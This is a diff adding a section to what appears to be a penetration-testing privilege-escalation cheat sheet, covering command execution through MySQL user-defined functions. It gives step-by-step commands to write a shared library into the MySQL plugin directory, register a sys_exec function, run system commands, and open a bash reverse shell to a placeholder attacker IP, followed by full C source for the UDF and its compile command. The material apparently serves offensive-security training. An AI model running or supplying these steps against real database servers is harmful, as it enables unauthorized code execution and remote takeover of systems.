@@ -64,3 +64,62 @@ Privilege Escalation
         BUILTIN\\Administrators:(I)(F)  
         BUILTIN\\Users:(I)(RX)  
     Successfully processed 1 files; Failed processing 0 files
+
+### 8) Command execution via User-Defined Functions (UDFs)
+
+In MySQL, command execution can be achieved via User-Defined Functions (UDFs), if applicable. Here's an example of how to upload a malicious shared object file to gain shell access:
+
+#### 1. Upload UDF library
+
+    mysql -u root -p -h <host> -e "use mysql; create table foo(line blob); insert into foo values(load_file('/path/to/your/udf/lib_mysqludf_sys.so')); select * from foo into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"
+
+#### 2. Create the UDF to execute system commands
+
+    CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
+
+#### 3. Execute commands
+
+    SELECT sys_exec('id');
+
+#### 4. Reverse shell
+
+    SELECT sys_exec('bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1');
+
+### 8.1) Compile your own .so for UDF
+
+lib_mysqludf_sys.c
+
+    #include <my_global.h>
+    #include <my_sys.h>
+    #include <mysql.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    
+    my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message);
+    void sys_exec_deinit(UDF_INIT *initid);
+    long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error);
+    
+    // Initialization function for UDF
+    my_bool sys_exec_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
+        if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
+            strcpy(message, "sys_exec() requires exactly one string argument");
+            return 1;
+        }
+        return 0;
+    }
+    
+    // Cleanup function for UDF
+    void sys_exec_deinit(UDF_INIT *initid) {
+        // Nothing to do
+    }
+    
+    // Execution function
+    long long sys_exec(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
+        const char *command = args->args[0];
+        return system(command);
+    }
+
+Compile the .so file into a shared object (.so)
+
+    gcc -Wall -fPIC -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c -lc
+
